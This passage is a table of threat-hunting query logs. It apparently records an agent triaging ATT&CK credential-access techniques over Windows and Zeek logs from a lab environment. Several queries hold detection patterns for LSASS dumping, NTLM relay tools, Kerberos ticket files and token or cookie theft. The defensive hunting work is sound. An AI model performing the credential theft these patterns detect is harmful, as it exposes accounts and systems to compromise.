| q-a7488fb616 | triage T1555 step 3 | get_event | {"index": ".ds-logs-windows.sysmon-default-2026.10.17-000001", "id": "AaFHM31uOFchItTka0Gm"} | None | F26 |
| q-503caa6882 | triage T1555 step 3 | get_event | {"index": ".ds-logs-windows.sysmon-default-2026.10.17-000001", "id": "AaFHM31uOFchItTka0Gj"} | None |  |
| q-1aa35e4620 | triage T1555 verify | get_event | {"index": ".ds-logs-windows.sysmon-default-2026.10.17-000001", "id": "AaFHM31uOFchItTka0Gm"} | None |  |
| q-80c4d987db | triage T1555 verify | get_event | {"index": ".ds-logs-windows.sysmon-default-2026.10.17-000001", "id": "AaFHM31uOFchItTka0Gm"} | None |  |
| q-eb649c46ac | triage T1555 verify | get_event | {"index": ".ds-logs-windows.sysmon-default-2026.10.17-000001", "id": "AaFHM31uOFchItTka0Gj"} | None |  |
| q-b9fffa943e | triage T1555 verify | get_event | {"index": ".ds-logs-windows.sysmon-default-2026.10.17-000001", "id": "AaFHM31uOFchItTka0Gj"} | None |  |
| q-c57b46dca5 | triage T1555 verify | get_event | {"index": ".ds-logs-windows.sysmon-default-2026.10.17-000001", "id": "AaFHM31uOFchItTka0Gm"} | None |  |
| q-a6d6540faf | triage T1555 verify | get_event | {"index": ".ds-logs-windows.security-default-2026.10.17-000001", "id": "AaFHNH1uOFchItVq1T6-"} | None |  |
| q-9aca3dce4d | triage T1555 verify | get_event | {"index": ".ds-logs-windows.security-default-2026.10.17-000001", "id": "AaFHNH1uOFchItVq1T6-"} | None |  |
| q-76b099ff4c | triage T1555 verify | get_event | {"index": ".ds-logs-windows.security-default-2026.10.17-000001", "id": "AaFHNH1uOFchItaDOqAA"} | None |  |
| q-ff52637af0 | triage T1555 verify | get_event | {"index": ".ds-logs-windows.sysmon-default-2026.10.17-000001", "id": "AaFHNH1uOFchItQE_JuD"} | None |  |
| q-3b5711c352 | triage T1555 verify | get_event | {"index": ".ds-logs-windows.sysmon-default-2026.10.17-000001", "id": "AaFHNH1uOFchItQE_JuD"} | None |  |
| q-a9f724279f | triage T1555 verify | get_event | {"index": ".ds-logs-windows.sysmon-default-2026.10.17-000001", "id": "AaFHM31uOFchItTka0Gm"} | None |  |
| q-5c711ebbc1 | triage T1556 step 1 | aggregate | {"dataset": "windows.sysmon", "field": "win.SourceImage", "query": "event.code:10 AND win.TargetImage:*lsass*", "time_from": null, "time_to": null, "size": 50, "sub_field": "win.GrantedAccess"} | 326 |  |
| q-40426c923e | triage T1556 step 1 | aggregate | {"dataset": "windows.sysmon", "field": "win.ImageLoaded", "query": "event.code:7 AND (win.ImageLoaded:*lsass* OR win.ImageLoaded:*cryptdll* OR win.ImageLoaded:*sam* OR win.ImageLoaded:*wdigest*)", "time_from": null, "time_to": null, "size": 50, "sub_field": nu… | 75 |  |
| q-3d7668e856 | triage T1556 step 2 | search | {"dataset": "windows.sysmon", "query": "event.code:10 AND win.TargetImage:*lsass* AND (win.SourceImage:*PowerShell* OR win.SourceImage:*wsmprovhost* OR win.SourceImage:*wininit* OR win.SourceImage:*csrss*)", "time_from": null, "time_to": null, "fields": ["@tim… | 8 | F37 |
| q-d1ae30109d | triage T1556 step 2 | search | {"dataset": "windows.sysmon", "query": "event.code:7 AND (win.ImageLoaded:*wdigest* OR win.ImageLoaded:*lsass* OR win.ImageLoaded:*samsrv*)", "time_from": null, "time_to": null, "fields": ["@timestamp", "host.name", "process.executable", "win.ImageLoaded", "wi… | 4 | F31 |
| q-c6fd7ab968 | triage T1556 step 3 | get_event | {"index": ".ds-logs-windows.sysmon-default-2026.10.17-000001", "id": "AaFHM31uOFchItTka0Gj"} | None | F37 |
| q-db8eff83d2 | triage T1556 step 3 | get_event | {"index": ".ds-logs-windows.sysmon-default-2026.10.17-000001", "id": "AaFHM31uOFchItTka0Gm"} | None |  |
| q-4deffe054f | triage T1556 step 3 | search | {"dataset": "windows.powershell", "query": "event.code:4104 AND (win.ScriptBlockText:*lsass* OR win.ScriptBlockText:*MiniDump* OR win.ScriptBlockText:*Dump* OR win.ScriptBlockText:*Credential* OR win.ScriptBlockText:*token*)", "time_from": null, "time_to": nul… | 4 |  |
| q-6986e84a86 | triage T1556 step 4 | get_event | {"index": ".ds-logs-windows.powershell-default-2026.10.17-000001", "id": "AaFHNX1uOFchItZCgBha"} | None |  |
| q-08d7155836 | triage T1556 step 4 | search | {"dataset": "windows.sysmon", "query": "event.code:13 AND (registry.path:*NetworkProvider* OR registry.path:*SecurityProviders* OR registry.path:*Notification* OR registry.path:*Lsa*)", "time_from": null, "time_to": null, "fields": ["@timestamp", "host.name", … | 445 |  |
| q-c128d7a599 | triage T1556 step 4 | search | {"dataset": "windows.security", "query": "event.code:4657", "time_from": null, "time_to": null, "fields": ["@timestamp", "host.name", "event.code", "win.ObjectName", "win.OperationType", "win.SubjectUserName", "win.NewValue"], "size": 30, "sort": "asc"} | 36 | F32, F36 |
| q-1a67d96049 | triage T1556 step 5 | search | {"dataset": "windows.security", "query": "event.code:5136 OR event.code:4739 OR event.code:4738 OR event.code:5137 OR event.code:5141", "time_from": null, "time_to": null, "fields": ["@timestamp", "host.name", "event.code", "win.ObjectName", "win.OperationType… | 0 |  |
| q-3a7b4430f4 | triage T1556 step 5 | search | {"dataset": "windows.other", "query": "event.code:7045 OR event.code:7040", "time_from": null, "time_to": null, "fields": ["@timestamp", "host.name", "event.code", "win.ServiceName", "win.ImagePath", "win.Message"], "size": 20, "sort": "asc"} | 9 |  |
| q-418a8ee2b7 | triage T1556 step 6 | search | {"dataset": "windows.security", "query": "event.code:4624 AND (win.AuthenticationPackageName:* OR win.LogonProcessName:*NtLmSsp* OR win.LogonProcessName:*Kerberos*)", "time_from": null, "time_to": null, "fields": ["@timestamp", "host.name", "event.code", "win.… | 297 | F33, F34, F35 |
| q-611b92899b | triage T1556 step 6 | aggregate | {"dataset": "windows.security", "field": "win.LogonProcessName", "query": "event.code:4624", "time_from": null, "time_to": null, "size": 20, "sub_field": null} | 297 |  |
| q-5099c0246d | triage T1556 verify | get_event | {"index": ".ds-logs-windows.sysmon-default-2026.10.17-000001", "id": "AaFHNH1uOFchItQE_JuD"} | None |  |
| q-197410e0f4 | triage T1556 verify | get_event | {"index": ".ds-logs-windows.sysmon-default-2026.10.17-000001", "id": "AaFHNH1uOFchItQE_JuD"} | None |  |
| q-60e875b14e | triage T1556 verify | get_event | {"index": ".ds-logs-windows.sysmon-default-2026.10.17-000001", "id": "AaFHNH1uOFchItQE_JuD"} | None |  |
| q-11c1b574ca | triage T1556 verify | get_event | {"index": ".ds-logs-windows.sysmon-default-2026.10.17-000001", "id": "AaFHM31uOFchItPEz_fX"} | None |  |
| q-ea5a9a431b | triage T1556 verify | get_event | {"index": ".ds-logs-windows.sysmon-default-2026.10.17-000001", "id": "AaFHM31uOFchItPEz_fX"} | None |  |
| q-a5eb5b8e98 | triage T1556 verify | get_event | {"index": ".ds-logs-windows.sysmon-default-2026.10.17-000001", "id": "AaFHM31uOFchItO7oWgL"} | None |  |
| q-c079211fa3 | triage T1556 verify | get_event | {"index": ".ds-logs-windows.security-default-2026.10.17-000001", "id": "AaFHNH1uOFchItVt5I2Y"} | None |  |
| q-d9272b36ec | triage T1556 verify | get_event | {"index": ".ds-logs-windows.security-default-2026.10.17-000001", "id": "AaFHNH1uOFchItVt5I2Y"} | None |  |
| q-77299d7ce7 | triage T1556 verify | get_event | {"index": ".ds-logs-windows.security-default-2026.10.17-000001", "id": "AaFHNH1uOFchItaKXhpQ"} | None |  |
| q-1c907cf7d9 | triage T1556 verify | get_event | {"index": ".ds-logs-windows.security-default-2026.10.17-000001", "id": "AaFHNH1uOFchItaKXhpQ"} | None |  |
| q-2cce300b4c | triage T1556 verify | get_event | {"index": ".ds-logs-windows.security-default-2026.10.17-000001", "id": "AaFHNH1uOFchItaKXhpQ"} | None |  |
| q-d2f9d3bcc7 | triage T1556 verify | get_event | {"index": ".ds-logs-windows.security-default-2026.10.17-000001", "id": "AaFHNH1uOFchItaKXhpQ"} | None |  |
| q-0584532132 | triage T1556 verify | get_event | {"index": ".ds-logs-windows.security-default-2026.10.17-000001", "id": "AaFHNH1uOFchItZ6CoZN"} | None |  |
| q-44c8699db9 | triage T1556 verify | get_event | {"index": ".ds-logs-windows.sysmon-default-2026.10.17-000001", "id": "AaFHM31uOFchItTka0Gj"} | None |  |
| q-be43ad892f | triage T1556 verify | get_event | {"index": ".ds-logs-windows.sysmon-default-2026.10.17-000001", "id": "AaFHM31uOFchItTka0Gm"} | None |  |
| q-8886408987 | triage T1556 verify | get_event | {"index": ".ds-logs-windows.sysmon-default-2026.10.17-000001", "id": "AaFHM31uOFchItTka0Gj"} | None |  |
| q-8964f2c1b4 | triage T1557 step 1 | get_event | {"index": ".ds-logs-windows.other-default-2026.10.17-000001", "id": "AaFHNH1uOFchItbrYMQT"} | None |  |
| q-757c5fe0bf | triage T1557 step 1 | search | {"dataset": "windows.sysmon", "query": "event.code:3 AND (destination.port:445 OR destination.port:139)", "time_from": null, "time_to": null, "fields": ["@timestamp", "host.name", "process.executable", "destination.ip", "destination.port", "win.DestinationHost… | 66 | F39, F41 |
| q-783c45a55f | triage T1557 step 1 | aggregate | {"dataset": "windows.security", "field": "win.ServiceName", "query": "event.code:4697", "time_from": null, "time_to": null, "size": 30, "sub_field": null} | 23 |  |
| q-5eac7aac6c | triage T1557 step 2 | esql | {"query": "FROM logs-windows.sysmon-default METADATA _id, _index \| WHERE event.code == 3 AND (destination.port == 445 OR destination.port == 139) \| STATS cnt = COUNT(*) BY host.name, destination.ip, process.executable \| SORT cnt DESC"} | ERROR |  |
| q-6d637dd937 | triage T1557 step 2 | search | {"dataset": "zeek", "query": "event.action:smb_files OR event.action:smb_mapping OR event.action:dce_rpc", "time_from": null, "time_to": null, "fields": ["@timestamp", "event.action", "source.ip", "destination.ip", "zeek.filename", "zeek.path", "zeek.name", "z… | 146 | F39, F40 |
| q-eb4b155ae7 | triage T1557 step 2 | search | {"dataset": "windows.other", "query": "event.code:7045 AND process.executable:*javamtsup*", "time_from": null, "time_to": null, "fields": ["@timestamp", "host.name", "user.name", "process.executable", "message"], "size": 5, "sort": "asc"} | 1 |  |
| q-0150222a95 | triage T1557 step 3 | esql | {"query": "FROM logs-windows.sysmon-default METADATA _id, _index \| WHERE event.code == \"3\" AND (destination.port == \"445\" OR destination.port == \"139\") \| STATS cnt = COUNT(*) BY host.name, destination.ip, process.executable \| SORT cnt DESC"} | ERROR |  |
| q-463d73a04a | triage T1557 step 3 | search | {"dataset": "windows.sysmon", "query": "process.executable:*javamtsup* OR process.command_line:*javamtsup* OR win.Image:*javamtsup*", "time_from": null, "time_to": null, "fields": ["@timestamp", "host.name", "event.code", "process.executable", "process.command… | 12 |  |
| q-11c555da7a | triage T1557 step 3 | search | {"dataset": "windows.sysmon", "query": "event.code:1 AND (process.command_line:*PSEXESVC* OR process.executable:*PSEXESVC* OR process.parent.executable:*PSEXESVC*)", "time_from": null, "time_to": null, "fields": ["@timestamp", "host.name", "process.executable"… | 8 | F38 |
| q-be07a3d911 | triage T1557 step 4 | esql | {"query": "FROM logs-windows.sysmon-default METADATA _id, _index \| WHERE event.code == \"3\" AND (destination.port == 445 OR destination.port == 139) \| STATS cnt = COUNT(*) BY host.name, destination.ip \| SORT cnt DESC"} | 7 |  |
| q-9f5ae39400 | triage T1557 step 4 | search | {"dataset": "windows.sysmon", "query": "process.executable:*python.exe AND (process.command_line:*responder* OR process.command_line:*smbrelay* OR process.command_line:*ntlmrelay* OR process.command_line:*mitm* OR process.command_line:*arp* OR process.command_… | 0 |  |
| q-744a9961ca | triage T1557 step 4 | search | {"dataset": "windows.sysmon", "query": "process.executable:*python.exe", "time_from": null, "time_to": null, "fields": ["@timestamp", "host.name", "process.executable", "process.command_line", "user.name", "process.parent.executable"], "size": 20, "sort": "asc… | 514 |  |
| q-2cb8569954 | triage T1557 step 5 | esql | {"query": "FROM logs-windows.sysmon-default METADATA _id, _index \| WHERE event.code == \"3\" AND process.executable LIKE \"*python.exe*\" \| KEEP @timestamp, host.name, process.executable, destination.ip, destination.port, network.transport, user.name \| SORT… | 348 |  |
| q-7c7e4b60f5 | triage T1557 step 5 | aggregate | {"dataset": "zeek", "field": "zeek.orig_l2_addr", "query": "event.action:conn", "time_from": null, "time_to": null, "size": 20, "sub_field": "source.ip"} | 613 | F40 |
| q-c53da1facd | triage T1557 step 5 | search | {"dataset": "windows.security", "query": "event.code:5156 AND (destination.port:445 OR destination.port:139)", "time_from": null, "time_to": null, "fields": ["@timestamp", "host.name", "process.executable", "destination.ip", "destination.port", "win.Direction"… | 168 |  |
| q-2177bf0a5a | triage T1557 step 6 | aggregate | {"dataset": "zeek", "field": "zeek.orig_l2_addr", "query": "event.action:conn", "time_from": null, "time_to": null, "size": 20, "sub_field": "destination.ip"} | 613 |  |
| q-a196709742 | triage T1557 step 6 | search | {"dataset": "zeek", "query": "event.action:dns AND (zeek.query:*dmevals* OR zeek.query:*local*)", "time_from": null, "time_to": null, "fields": ["@timestamp", "source.ip", "zeek.query", "zeek.answers", "zeek.rcode_name"], "size": 20, "sort": "asc"} | 22 | F39 |
| q-9fd44e1194 | triage T1557 verify | get_event | {"index": ".ds-logs-windows.other-default-2026.10.17-000001", "id": "AaFHNH1uOFchItbrYMQT"} | None |  |
| q-39cd42188a | triage T1557 verify | get_event | {"index": ".ds-logs-windows.sysmon-default-2026.10.17-000001", "id": "AaFHM31uOFchItTVGQmt"} | None |  |
| q-ddfd96ed11 | triage T1557 verify | get_event | {"index": ".ds-logs-windows.sysmon-default-2026.10.17-000001", "id": "AaFHM31uOFchItTVGQmt"} | None |  |
| q-d193f30ef0 | triage T1557 verify | get_event | {"index": ".ds-logs-windows.sysmon-default-2026.10.17-000001", "id": "AaFHM31uOFchItTqgghU"} | None |  |
| q-1c73fe2bd2 | triage T1557 verify | get_event | {"index": ".ds-logs-zeek-default-2026.10.17-000001", "id": "AaFHNX1uOFchItbgrog4"} | None |  |
| q-b04df88d93 | triage T1557 verify | get_event | {"index": ".ds-logs-zeek-default-2026.10.17-000001", "id": "AaFHNX1uOFchItbgrYj4"} | None |  |
| q-2d543ae8a5 | triage T1557 verify | get_event | {"index": ".ds-logs-zeek-default-2026.10.17-000001", "id": "AaFHNX1uOFchItbgrog4"} | None |  |
| q-fa9ad70e45 | triage T1557 verify | get_event | {"index": ".ds-logs-zeek-default-2026.10.17-000001", "id": "AaFHNX1uOFchItbgrog4"} | None |  |
| q-97379851bb | triage T1557 verify | get_event | {"index": ".ds-logs-windows.sysmon-default-2026.10.17-000001", "id": "AaFHNH1uOFchItQD9ggh"} | None |  |
| q-bb0a242912 | triage T1557 step 8 | get_event | {"index": ".ds-logs-zeek-default-2026.10.17-000001", "id": "AaFHNX1uOFchItbgrog4"} | None |  |
| q-cad807b6c9 | triage T1558 step 1 | esql | {"query": "FROM logs-windows.security-default METADATA _id, _index \| WHERE event.code == 4769 \| KEEP @timestamp, host.name, win.TargetUserName, win.ServiceName, win.TicketEncryptionType, win.TicketOptions, win.IpAddress, win.Status, win.LogonGuid, _id, _inde… | ERROR |  |
| q-9ec340c7e3 | triage T1558 step 1 | esql | {"query": "FROM logs-windows.security-default METADATA _id, _index \| WHERE event.code == 4768 \| KEEP @timestamp, host.name, win.TargetUserName, win.PreAuthType, win.TicketEncryptionType, win.IpAddress, win.Status, _id, _index \| SORT @timestamp"} | ERROR |  |
| q-e11b5c0414 | triage T1558 step 2 | esql | {"query": "FROM logs-windows.security-default METADATA _id, _index \| WHERE event.code == \"4769\" \| KEEP @timestamp, host.name, win.TargetUserName, win.ServiceName, win.TicketEncryptionType, win.TicketOptions, win.IpAddress, win.Status, win.LogonGuid, _id, _… | 28 | F43, F44, F45 |
| q-7cd62bc680 | triage T1558 step 2 | esql | {"query": "FROM logs-windows.security-default METADATA _id, _index \| WHERE event.code == \"4768\" \| KEEP @timestamp, host.name, win.TargetUserName, win.PreAuthType, win.TicketEncryptionType, win.IpAddress, win.Status, _id, _index \| SORT @timestamp"} | 14 | F45, F46 |
| q-8c05690c7c | triage T1558 step 3 | esql | {"query": "FROM logs-windows.sysmon-default METADATA _id, _index \| WHERE event.code == \"10\" AND win.TargetImage LIKE \"*lsass*\" AND win.GrantedAccess IN (\"0x1fffff\",\"0x101001\",\"0x1f3fff\",\"0x1000000\",\"0x3000\",\"0x1400\") \| KEEP @timestamp, host.n… | 33 | F42 |
| q-60371c275b | triage T1558 step 3 | esql | {"query": "FROM logs-windows.sysmon-default METADATA _id, _index \| WHERE event.code == \"1\" \| KEEP @timestamp, host.name, process.executable, process.command_line, process.parent.executable, user.name, _id, _index \| SORT @timestamp"} | 447 | F42 |
| q-a9082b6955 | triage T1558 step 4 | esql | {"query": "FROM logs-windows.powershell-default METADATA _id, _index \| WHERE event.code == \"4104\" \| KEEP @timestamp, host.name, win.ScriptBlockText, user.name, _id, _index \| SORT @timestamp"} | 414 |  |
| q-3ac345949c | triage T1558 step 4 | get_event | {"index": ".ds-logs-windows.sysmon-default-2026.10.17-000001", "id": "AaFHM31uOFchItTka0Gj"} | None | F42 |
| q-adcfe2c104 | triage T1558 step 5 | get_event | {"index": ".ds-logs-windows.powershell-default-2026.10.17-000001", "id": "AaFHNX1uOFchItZWqNA3"} | None | F42 |
| q-0019ad21b1 | triage T1558 step 5 | esql | {"query": "FROM logs-windows.security-default METADATA _id, _index \| WHERE event.code == \"4688\" AND (process.command_line LIKE \"*lsass*\" OR process.command_line LIKE \"*dump*\" OR process.command_line LIKE \"*procdump*\" OR process.command_line LIKE \"*se… | 0 |  |
| q-cc0d6cf1eb | triage T1558 step 6 | esql | {"query": "FROM logs-windows.sysmon-default METADATA _id, _index \| WHERE event.code == \"11\" AND (file.path LIKE \"*kirbi*\" OR file.path LIKE \"*ticket*\" OR file.path LIKE \"*lsass*\" OR file.path LIKE \"*.dmp\") \| KEEP @timestamp, host.name, file.path, p… | 2 |  |
| q-3ec481c2c3 | triage T1558 step 6 | esql | {"query": "FROM logs-windows.security-default METADATA _id, _index \| WHERE event.code == \"4624\" AND win.LogonType == \"3\" AND win.TargetUserName LIKE \"*pbeesly*\" \| KEEP @timestamp, host.name, win.TargetUserName, win.IpAddress, win.LogonProcessName, win.… | 20 |  |
| q-3cf105b511 | triage T1558 verify | get_event | {"index": ".ds-logs-windows.sysmon-default-2026.10.17-000001", "id": "AaFHM31uOFchItTka0Gj"} | None |  |
| q-dba7a9861b | triage T1558 verify | get_event | {"index": ".ds-logs-windows.sysmon-default-2026.10.17-000001", "id": "AaFHM31uOFchItTka0Gj"} | None |  |
| q-39aadacbc8 | triage T1558 verify | get_event | {"index": ".ds-logs-windows.sysmon-default-2026.10.17-000001", "id": "AaFHM31uOFchItTka0Gj"} | None |  |
| q-44a0429d6b | triage T1558 verify | get_event | {"index": ".ds-logs-windows.sysmon-default-2026.10.17-000001", "id": "AaFHNH1uOFchItUHCTY0"} | None |  |
| q-5a217bdbae | triage T1558 verify | get_event | {"index": ".ds-logs-windows.sysmon-default-2026.10.17-000001", "id": "AaFHNH1uOFchItQE_psP"} | None |  |
| q-901f1c176e | triage T1558 verify | get_event | {"index": ".ds-logs-windows.powershell-default-2026.10.17-000001", "id": "AaFHNX1uOFchItZWqNA3"} | None |  |
| q-57129316ae | triage T1558 verify | get_event | {"index": ".ds-logs-windows.security-default-2026.10.17-000001", "id": "AaFHNH1uOFchItaDOKC-"} | None |  |
| q-91d576b00d | triage T1558 verify | get_event | {"index": ".ds-logs-windows.security-default-2026.10.17-000001", "id": "AaFHNH1uOFchItaDOKC-"} | None |  |
| q-84c5320401 | triage T1558 verify | get_event | {"index": ".ds-logs-windows.security-default-2026.10.17-000001", "id": "AaFHNH1uOFchItaDOKC-"} | None |  |
| q-c2f7e4e76b | triage T1558 verify | get_event | {"index": ".ds-logs-windows.security-default-2026.10.17-000001", "id": "AaFHNH1uOFchItZ8FbW6"} | None |  |
| q-3833498daf | triage T1558 verify | get_event | {"index": ".ds-logs-windows.security-default-2026.10.17-000001", "id": "AaFHNH1uOFchItV3-aUM"} | None |  |
| q-0179144000 | triage T1558 verify | get_event | {"index": ".ds-logs-windows.security-default-2026.10.17-000001", "id": "AaFHNH1uOFchItZ7Ef_w"} | None |  |
| q-61df7cd5c0 | triage T1558 verify | get_event | {"index": ".ds-logs-windows.security-default-2026.10.17-000001", "id": "AaFHNH1uOFchItZ8FbW6"} | None |  |
| q-125f61a0e2 | triage T1558 verify | get_event | {"index": ".ds-logs-windows.security-default-2026.10.17-000001", "id": "AaFHNH1uOFchItZ7Ef_w"} | None |  |
| q-f877c72e6b | triage T1558 verify | get_event | {"index": ".ds-logs-windows.security-default-2026.10.17-000001", "id": "AaFHNH1uOFchItV3-aXJ"} | None |  |
| q-df9a8f05d9 | triage T1606 step 1 | get_event | {"index": ".ds-logs-windows.powershell-default-2026.10.17-000001", "id": "AaFHNX1uOFchItZRllBR"} | None | F47 |
| q-240dd2a3ea | triage T1606 step 1 | aggregate | {"dataset": "windows.sysmon", "field": "process.executable", "query": "event.code:10 AND win.GrantedAccess:0x1fffff", "time_from": null, "time_to": null, "size": 30, "sub_field": null} | 1131 |  |
| q-ed8b8e8995 | triage T1606 step 2 | esql | {"query": "FROM logs-windows.sysmon-default METADATA _id, _index \| WHERE event.code == \"10\" AND win.GrantedAccess == \"0x1fffff\" AND process.executable LIKE \"*cod.3aka3*\" \| KEEP @timestamp, host.name, process.executable, win.TargetImage, win.GrantedAcce… | 4 |  |
| q-7e6e5287f4 | triage T1606 step 2 | esql | {"query": "FROM logs-windows.sysmon-default METADATA _id, _index \| WHERE event.code == \"10\" AND win.TargetImage LIKE \"*lsass*\" \| STATS cnt = COUNT(*) BY process.executable, win.GrantedAccess \| SORT cnt DESC \| LIMIT 30"} | 15 |  |
| q-de7f3aabae | triage T1606 step 3 | esql | {"query": "FROM logs-windows.sysmon-default METADATA _id, _index \| WHERE event.code == \"1\" AND process.executable LIKE \"*cod.3aka3*\" \| KEEP @timestamp, host.name, process.executable, process.command_line, process.parent.executable, user.name, _id, _index… | 1 |  |
| q-01ca97af1b | triage T1606 step 3 | esql | {"query": "FROM logs-windows.security-default METADATA _id, _index \| WHERE event.code == \"4648\" \| KEEP @timestamp, host.name, user.name, win.TargetUserName, win.TargetServerName, win.ProcessName, source.ip, _id, _index \| LIMIT 30"} | 15 |  |
| q-b9e1cafb96 | triage T1606 step 4 | esql | {"query": "FROM logs-windows.powershell-default METADATA _id, _index \| WHERE event.code == \"4104\" \| STATS cnt = COUNT(*) BY win.Path \| SORT cnt DESC \| LIMIT 30"} | 14 |  |
| q-97861e1994 | triage T1606 step 4 | esql | {"query": "FROM logs-zeek-default METADATA _id, _index \| WHERE event.action == \"kerberos\" \| KEEP @timestamp, source.ip, destination.ip, zeek.client, zeek.service, zeek.success, zeek.error_msg, _id, _index \| LIMIT 40"} | 35 | F49 |
| q-3d7a7d1de6 | triage T1606 step 5 | esql | {"query": "FROM logs-windows.sysmon-default METADATA _id, _index \| WHERE event.code == \"3\" AND process.executable LIKE \"*cod.3aka3*\" \| KEEP @timestamp, host.name, process.executable, destination.ip, destination.port, _id, _index \| LIMIT 20"} | 1 | F48 |
| q-3398ffb678 | triage T1606 step 5 | esql | {"query": "FROM logs-windows.sysmon-default METADATA _id, _index \| WHERE event.code == \"11\" AND (file.path LIKE \"*Cookie*\" OR file.path LIKE \"*cookie*\" OR file.path LIKE \"*Token*\" OR file.path LIKE \"*SAML*\") \| KEEP @timestamp, host.name, file.path,… | 1 | F48 |
| q-01cb9db640 | triage T1606 step 6 | get_event | {"index": ".ds-logs-windows.sysmon-default-2026.10.17-000001", "id": "AaFHNH1uOFchItQE_psP"} | None | F48 |
| q-b95c9a0600 | triage T1606 verify | get_event | {"index": ".ds-logs-windows.powershell-default-2026.10.17-000001", "id": "AaFHNX1uOFchItZRllBR"} | None |  |
| q-1e4f6fa21e | triage T1606 verify | get_event | {"index": ".ds-logs-windows.powershell-default-2026.10.17-000001", "id": "AaFHNX1uOFchItZRllBR"} | None |  |
| q-32aefd822b | triage T1606 verify | get_event | {"index": ".ds-logs-windows.other-default-2026.10.17-000001", "id": "AaFHNH1uOFchItbrX8TL"} | None |  |
| q-24185f7ff2 | triage T1606 verify | get_event | {"index": ".ds-logs-windows.other-default-2026.10.17-000001", "id": "AaFHNH1uOFchItbrYMQT"} | None |  |
| q-928eb0a347 | triage T1606 verify | get_event | {"index": ".ds-logs-windows.sysmon-default-2026.10.17-000001", "id": "AaFHM31uOFchItOVAUl3"} | None |  |
| q-99d632fee0 | triage T1606 verify | get_event | {"index": ".ds-logs-windows.sysmon-default-2026.10.17-000001", "id": "AaFHM31uOFchItOVAUl3"} | None |  |
| q-12d1d5cedf | triage T1606 verify | get_event | {"index": ".ds-logs-windows.sysmon-default-2026.10.17-000001", "id": "AaFHNH1uOFchItQE_psP"} | None |  |
| q-f75a7ee6a1 | triage T1606 verify | get_event | {"index": ".ds-logs-windows.sysmon-default-2026.10.17-000001", "id": "AaFHNH1uOFchItQE_Zth"} | None |  |
| q-1d8db2ee7b | triage T1606 verify | get_event | {"index": ".ds-logs-windows.powershell-default-2026.10.17-000001", "id": "AaFHNX1uOFchItZRllBR"} | None |  |
| q-74e2b3f7a6 | triage T1606 verify | get_event | {"index": ".ds-logs-zeek-default-2026.10.17-000001", "id": "AaFHNX1uOFchItbgrYi0"} | None |  |
| q-ed9e6c1427 | triage T1606 verify | get_event | {"index": ".ds-logs-zeek-default-2026.10.17-000001", "id": "AaFHNX1uOFchItbgrIjk"} | None |  |
| q-101b4b62b3 | triage T1606 step 8 | esql | {"query": "FROM logs-windows.other-default METADATA _id, _index \| WHERE event.code == \"7045\" \| KEEP @timestamp, host.name, process.executable, win.ServiceName, _id, _index \| LIMIT 10"} | 5 | F47 |
| q-2ec998f72d | triage T1606 step 8 | esql | {"query": "FROM logs-windows.powershell-default METADATA _id, _index \| WHERE event.code == \"4104\" AND win.Path LIKE \"*readme.ps1*\" \| KEEP @timestamp, host.name, win.Path, user.name, _id, _index \| LIMIT 5"} | 4 | F47, F49 |
| q-3e67b1172d | triage T1621 step 1 | aggregate | {"dataset": "windows.other", "field": "event.code", "query": "event.code:7045 OR event.code:5857 OR event.code:5858", "time_from": null, "time_to": null, "size": 20, "sub_field": null} | 90 |  |
| q-e2996617f5 | triage T1621 step 1 | aggregate | {"dataset": "windows.other", "field": "host.name", "query": "event.code:7045 OR event.code:5857 OR event.code:5858", "time_from": null, "time_to": null, "size": 20, "sub_field": null} | 90 |  |
| q-df9d29bc5c | triage T1621 step 2 | search | {"dataset": "windows.other", "query": "event.code:7045", "time_from": null, "time_to": null, "fields": ["@timestamp", "host.name", "event.code", "win.ServiceName", "win.ImagePath", "win.ServiceType", "win.StartType", "message", "user.name"], "size": 10, "sort"… | 5 | F50 |
| q-27e0057508 | triage T1621 step 2 | search | {"dataset": "windows.other", "query": "event.code:5857", "time_from": null, "time_to": null, "fields": ["@timestamp", "host.name", "event.code", "message", "user.name"], "size": 5, "sort": "asc"} | 36 | F50 |
| q-42e69088fa | triage T1621 step 3 | aggregate | {"dataset": "windows.security", "field": "event.code", "query": "event.code:4624 OR event.code:4625 OR event.code:4672 OR event.code:4648", "time_from": null, "time_to": null, "size": 20, "sub_field": null} | 524 |  |
| q-f2fbb47171 | triage T1621 step 3 | search | {"dataset": "windows.powershell", "query": "event.code:4104 AND (win.ScriptBlockText:*MFA* OR win.ScriptBlockText:*2FA* OR win.ScriptBlockText:*Authenticator* OR win.ScriptBlockText:*OneTime* OR win.ScriptBlockText:*OTP*)", "time_from": null, "time_to": null, … | 0 |  |
| q-96537f8cdc | triage T1621 step 4 | search | {"dataset": "windows.security", "query": "event.code:4648", "time_from": null, "time_to": null, "fields": ["@timestamp", "host.name", "event.code", "win.TargetUserName", "win.SubjectUserName", "win.TargetServerName", "win.ProcessName", "source.ip"], "size": 15… | 15 | F50 |
| q-dd49336344 | triage T1621 step 4 | search | {"dataset": "windows.sysmon", "query": "event.code:1 AND (process.command_line:*psexec* OR process.command_line:*PSEXESVC* OR process.executable:*PSEXESVC*)", "time_from": null, "time_to": null, "fields": ["@timestamp", "host.name", "event.code", "process.exec… | 4 | F50 |
| q-03b305bff1 | triage T1621 step 5 | search | {"dataset": "zeek", "query": "event.action:http AND (url.original:*mfa* OR url.original:*auth* OR url.original:*otp* OR url.original:*2fa*)", "time_from": null, "time_to": null, "fields": ["@timestamp", "url.original", "host.name", "source.ip", "destination.ip… | 0 |  |
| q-ac25d8832f | triage T1621 verify | get_event | {"index": ".ds-logs-windows.other-default-2026.10.17-000001", "id": "AaFHNH1uOFchItbrX8Rp"} | None |  |
| q-20fc795f67 | triage T1621 verify | get_event | {"index": ".ds-logs-windows.other-default-2026.10.17-000001", "id": "AaFHNH1uOFchItbrX8Rl"} | None |  |
| q-c1d086bbd3 | triage T1621 verify | get_event | {"index": ".ds-logs-windows.other-default-2026.10.17-000001", "id": "AaFHNH1uOFchItbrYMQT"} | None |  |
| q-f8a542745c | triage T1621 verify | get_event | {"index": ".ds-logs-windows.other-default-2026.10.17-000001", "id": "AaFHNH1uOFchItbrX8TL"} | None |  |
| q-d87fb502f4 | triage T1621 verify | get_event | {"index": ".ds-logs-windows.security-default-2026.10.17-000001", "id": "AaFHNH1uOFchItZ7Ev8p"} | None |  |
| q-c683a765c9 | triage T1621 verify | get_event | {"index": ".ds-logs-windows.sysmon-default-2026.10.17-000001", "id": "AaFHNH1uOFchItUGBlWZ"} | None |  |
| q-e757529fe3 | triage T1649 step 1 | get_event | {"index": ".ds-logs-windows.powershell-default-2026.10.17-000001", "id": "AaFHNX1uOFchItZSl2ML"} | None | F51 |
